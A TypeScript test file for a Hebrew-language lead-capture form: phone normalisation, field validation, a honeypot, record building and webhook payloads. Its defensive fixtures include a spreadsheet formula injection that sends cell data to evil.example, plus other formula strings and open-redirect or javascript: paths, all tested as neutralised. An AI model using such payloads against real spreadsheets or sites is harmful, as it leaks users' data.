import { describe, expect, it } from "vitest";
import {
  buildLeadRecord,
  cleanText,
  normalizePhone,
  phoneToInternational,
  toWebhookPayload,
  validateLead,
  type Lead,
} from "@/lib/lead";
import { pickTracking } from "@/lib/utm";

const UUID =
  /^[0-9a-f]{8}-[0-9a-f]{4}-[1-8][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const HEBREW = /[֐-׿]/;

const required = { phone: "required" } as const;
const optional = { phone: "optional" } as const;
const hidden = { phone: "hidden" } as const;

const valid = {
  name: "דנה כהן",
  email: " Dana@Example.co.il ",
  phone: "050-123-4567",
  marketingConsent: true,
};

describe("cleanText", () => {
  it("מסיר תווים בלתי נראים ותווי כיווניות, ומכווץ רווחים", () => {
    expect(cleanText("דנה​ ‮כהן‏")).toBe("דנה כהן");
    expect(cleanText("  a⁦b⁩   c﻿ ")).toBe("ab c");
    expect(cleanText("a\u0000b\nc\td")).toBe("ab c d");
  });
});

describe("normalizePhone", () => {
  it.each([
    ["0501234567", "0501234567"],
    ["050-123-4567", "0501234567"],
    ["050 123 4567", "0501234567"],
    ["(050) 123-4567", "0501234567"],
    ["+972-50-123-4567", "0501234567"],
    ["+972501234567", "0501234567"],
    ["972501234567", "0501234567"],
    ["00972501234567", "0501234567"],
    ["+972 (0)50-123-4567", "0501234567"],
    ["03-1234567", "031234567"],
    ["+97231234567", "031234567"],
    ["02-6543210", "026543210"],
    ["04-8123456", "048123456"],
    ["08-9123456", "089123456"],
    ["09-7123456", "097123456"],
    ["072-2123456", "0722123456"],
    ["077-1234567", "0771234567"],
  ])("%s ← %s", (input, expected) => {
    expect(normalizePhone(input)).toBe(expected);
  });

  it.each([
    "",
    "12345",
    "050123456",
    "05012345678",
    "0601234567",
    "0101234567",
    "05a1234567",
    "+1 555 123 4567",
    "0001234567",
    "+972",
    "050-123-4567 ext 3",
  ])("דוחה את %s", (input) => {
    expect(normalizePhone(input)).toBeNull();
  });

  it.each([
    ["٠٥٠١٢٣٤٥٦٧", "0501234567"],
    ["٠٥٠-١٢٣-٤٥٦٧", "0501234567"],
    ["۰۵۰۱۲۳۴۵۶۷", "0501234567"],
    ["050\u2011123\u20114567", "0501234567"],
    ["050\u2013123\u20134567", "0501234567"],
    ["050\u2010123\u20154567", "0501234567"],
    ["050\u2212123\u22124567", "0501234567"],
    ["+972\u201150\u20111234567", "0501234567"],
  ])("ספרות ומקפים לא סטנדרטיים: %s ← %s", (input, expected) => {
    expect(normalizePhone(input)).toBe(expected);
  });

  it("ממיר לפורמט בינלאומי בלי 0", () => {
    expect(phoneToInternational("0501234567")).toBe("972501234567");
    expect(phoneToInternational("031234567")).toBe("97231234567");
  });
});

describe("validateLead", () => {
  it("ליד תקין מנורמל", () => {
    const r = validateLead(valid, required);
    expect(r).toEqual({
      ok: true,
      lead: {
        name: "דנה כהן",
        email: "dana@example.co.il",
        phone: "0501234567",
        marketingConsent: true,
      },
    });
  });

  it("+972-50-123-4567 ← 0501234567", () => {
    const r = validateLead({ ...valid, phone: "+972-50-123-4567" }, required);
    expect(r.ok && r.lead.phone).toBe("0501234567");
  });

  it("הסכמה לדיוור רק כש-true בוליאני. ברירת מחדל false", () => {
    for (const v of [undefined, "true", "on", 1, null, false]) {
      const r = validateLead({ ...valid, marketingConsent: v }, required);
      expect(r.ok && r.lead.marketingConsent).toBe(false);
    }
  });

  it("שם: 2–80 תווים אחרי ניקוי", () => {
    for (const name of ["א", "  ", "​​​", "x".repeat(81), 123, undefined]) {
      const r = validateLead({ ...valid, name }, required);
      expect(r.ok).toBe(false);
      if (!r.ok && "errors" in r) {
        expect(r.errors.name).toMatch(HEBREW);
      }
    }
    const ok = validateLead({ ...valid, name: "x".repeat(80) }, required);
    expect(ok.ok).toBe(true);
  });

  it("שם עם תווים בלתי נראים מנוקה", () => {
    const r = validateLead({ ...valid, name: "דנה​ ‮כהן" }, required);
    expect(r.ok && r.lead.name).toBe("דנה כהן");
  });

  it("מייל לא תקין או ארוך מ-254 נדחה", () => {
    const long = `${"a".repeat(64)}@${"b".repeat(186)}.com`; // 255
    for (const email of [
      "dana@",
      "dana example.com",
      "@x.com",
      "dana@x",
      long,
      "",
      5,
    ]) {
      const r = validateLead({ ...valid, email }, required);
      expect(r.ok).toBe(false);
      if (!r.ok && "errors" in r) expect(r.errors.email).toMatch(HEBREW);
    }
  });

  it("מייל עם תווים בלתי נראים מנוקה", () => {
    const r = validateLead({ ...valid, email: "dana​@example.com‏" }, required);
    expect(r.ok && r.lead.email).toBe("dana@example.com");
  });

  it("טלפון חובה: ריק או לא תקין נדחה", () => {
    for (const phone of ["", undefined, "123"]) {
      const r = validateLead({ ...valid, phone }, required);
      expect(r.ok).toBe(false);
      if (!r.ok && "errors" in r) expect(r.errors.phone).toMatch(HEBREW);
    }
  });

  it("טלפון רשות: ריק עובר, לא תקין נדחה", () => {
    const empty = validateLead({ ...valid, phone: "" }, optional);
    expect(empty.ok && empty.lead.phone).toBe("");
    const missing = validateLead({ ...valid, phone: undefined }, optional);
    expect(missing.ok && missing.lead.phone).toBe("");
    expect(validateLead({ ...valid, phone: "123" }, optional).ok).toBe(false);
  });

  it("טלפון מוסתר: מתעלמים ממה שנשלח", () => {
    const r = validateLead({ ...valid, phone: "zzz" }, hidden);
    expect(r.ok && r.lead.phone).toBe("");
  });

  it("מלכודת בוטים (website) מסומנת כספאם", () => {
    expect(
      validateLead({ ...valid, website: "http://spam.example" }, required),
    ).toEqual({
      ok: false,
      spam: true,
    });
    expect(validateLead({ ...valid, website: "" }, required).ok).toBe(true);
    expect(validateLead({ ...valid, website: "   " }, required).ok).toBe(true);
  });

  it("קלט שאינו אובייקט נדחה עם הודעה בעברית", () => {
    for (const input of [null, "str", [], 5, undefined]) {
      const r = validateLead(input, required);
      expect(r.ok).toBe(false);
      if (!r.ok && "errors" in r)
        expect(Object.values(r.errors)[0]).toMatch(HEBREW);
    }
  });

  it("מחרוזות ענקיות נדחות בלי לקרוס", () => {
    const huge = "א".repeat(100_000);
    const r = validateLead({ name: huge, email: huge, phone: huge }, required);
    expect(r.ok).toBe(false);
    if (!r.ok && "errors" in r) {
      expect(Object.keys(r.errors).sort()).toEqual(["email", "name", "phone"]);
    }
  });
});

describe("buildLeadRecord", () => {
  const lead: Lead = {
    name: "דנה כהן",
    email: "dana@example.co.il",
    phone: "0501234567",
    marketingConsent: true,
  };
  const tracking = pickTracking({
    utm_source: "facebook",
    landingPath: "/?utm_source=facebook",
  });
  const now = new Date("2026-11-01T10:00:00.000Z");
  const base = new URL("https://example.co.il");

  it("בונה רשומה עם מזהים, זמן, ובלי IP", () => {
    const r = buildLeadRecord(lead, tracking, {
      now,
      baseUrl: base,
      userAgent: "UA/1.0",
    });
    expect(r.id).toMatch(UUID);
    expect(r.eventId).toMatch(UUID);
    expect(r.id).not.toBe(r.eventId);
    expect(r.createdAt).toBe("2026-11-01T10:00:00.000Z");
    expect(r.lead).toEqual(lead);
    expect(r.tracking).toEqual(tracking);
    expect(r.userAgent).toBe("UA/1.0");
    expect(r.pageUrl).toBe("https://example.co.il/?utm_source=facebook");
    expect(Object.keys(r)).not.toContain("ip");
    expect(JSON.stringify(r)).not.toMatch(/client_ip|"ip"/);
  });

  it("eventId מהלקוח נשמר רק אם הוא UUID תקין", () => {
    const clientId = "3f1c2b9e-6a7d-4e8f-9a0b-1c2d3e4f5a6b";
    expect(
      buildLeadRecord(lead, tracking, { now, baseUrl: base, eventId: clientId })
        .eventId,
    ).toBe(clientId);
    for (const eventId of [
      "abc",
      "",
      5,
      "3f1c2b9e-6a7d-4e8f-9a0b-1c2d3e4f5a6b-extra",
    ]) {
      const r = buildLeadRecord(lead, tracking, {
        now,
        baseUrl: base,
        eventId,
      });
      expect(r.eventId).toMatch(UUID);
      expect(r.eventId).not.toBe(eventId);
    }
  });

  it("נתיב נחיתה שאינו נתיב מקומי לא משנה את הכתובת לאתר אחר", () => {
    for (const landingPath of [
      "//evil.example/x",
      "https://evil.example",
      "javascript:alert(1)",
    ]) {
      const t = pickTracking({ landingPath });
      const r = buildLeadRecord(lead, t, { now, baseUrl: base });
      expect(new URL(r.pageUrl).origin).toBe("https://example.co.il");
    }
  });

  it("user agent נחתך ל-400 תווים", () => {
    const r = buildLeadRecord(lead, tracking, {
      now,
      baseUrl: base,
      userAgent: "u".repeat(1000),
    });
    expect(r.userAgent.length).toBe(400);
  });
});

describe("toWebhookPayload", () => {
  it("מבנה שטוח שקל למפות ב-Make", () => {
    const lead: Lead = {
      name: "דנה כהן",
      email: "dana@example.co.il",
      phone: "0501234567",
      marketingConsent: false,
    };
    const tracking = pickTracking({
      utm_source: "ig",
      utm_campaign: "nov",
      landingPath: "/",
    });
    const record = buildLeadRecord(lead, tracking, {
      now: new Date("2026-11-01T10:00:00.000Z"),
      baseUrl: new URL("https://example.co.il"),
      userAgent: "UA",
    });
    const p = toWebhookPayload(record);
    expect(Object.keys(p)).toEqual([
      "id",
      "createdAt",
      "name",
      "email",
      "phone",
      "marketingConsent",
      "utm_source",
      "utm_medium",
      "utm_campaign",
      "utm_content",
      "utm_term",
      "fbclid",
      "fbp",
      "fbc",
      "referrer",
      "landingPath",
      "source",
      "eventId",
      "pageUrl",
    ]);
    expect(p).toMatchObject({
      id: record.id,
      name: "דנה כהן",
      email: "dana@example.co.il",
      phone: "0501234567",
      marketingConsent: false,
      utm_source: "ig",
      utm_campaign: "nov",
      source: "ig",
      eventId: record.eventId,
      pageUrl: "https://example.co.il/",
    });
  });
});

describe("toWebhookPayload: הגנה מהזרקת נוסחה לגיליון", () => {
  const lead: Lead = {
    name: '=HYPERLINK("https://evil.example/?d="&A1,"לחצו")',
    email: "dana@example.co.il",
    phone: "0501234567",
    marketingConsent: true,
  };
  const record = () =>
    buildLeadRecord(
      lead,
      pickTracking({
        utm_source: "+cmd",
        utm_medium: "-1+1",
        utm_campaign: "@SUM(A1)",
        utm_content: "=IMPORTXML(\"x\")",
        utm_term: "רגיל",
        fbclid: "-IwAR",
        fbp: "=fb",
        fbc: "+fb",
        referrer: "=https://x",
        landingPath: "=1",
      }),
      {
        now: new Date("2026-11-01T10:00:00.000Z"),
        baseUrl: new URL("https://example.co.il"),
      },
    );

  it("שדות חופשיים שמתחילים ב-= + - @ מקבלים גרש בהתחלה", () => {
    const p = toWebhookPayload(record());
    expect(p.name).toBe(`'${lead.name}`);
    expect(p.utm_source).toBe("'+cmd");
    expect(p.utm_medium).toBe("'-1+1");
    expect(p.utm_campaign).toBe("'@SUM(A1)");
    expect(p.utm_content).toBe("'=IMPORTXML(\"x\")");
    expect(p.referrer).toBe("'=https://x");
    expect(p.landingPath).toBe("'=1");
    expect(p.source).toBe("'+cmd");
    expect(p.utm_term).toBe("רגיל");
  });

  it("טאב בהתחלה גם מנוטרל", async () => {
    const { neutralizeFormula } = await import("@/lib/lead");
    expect(neutralizeFormula("\t=1")).toBe("'\t=1");
    expect(neutralizeFormula("ok")).toBe("ok");
    expect(neutralizeFormula("")).toBe("");
  });

  it("טלפון, מייל ומזהים לא משתנים, וגם הגיבוי (הרשומה) נשאר כמו שנשלח", () => {
    const r = record();
    const p = toWebhookPayload(r);
    expect(p.email).toBe("dana@example.co.il");
    expect(p.phone).toBe("0501234567");
    expect(p.id).toBe(r.id);
    expect(p.eventId).toBe(r.eventId);
    expect(p.fbclid).toBe("-IwAR");
    expect(p.fbp).toBe("=fb");
    expect(p.fbc).toBe("+fb");
    expect(p.pageUrl).toBe(r.pageUrl);
    expect(r.lead.name).toBe(lead.name);
    expect(r.tracking.utm_source).toBe("+cmd");
  });
});
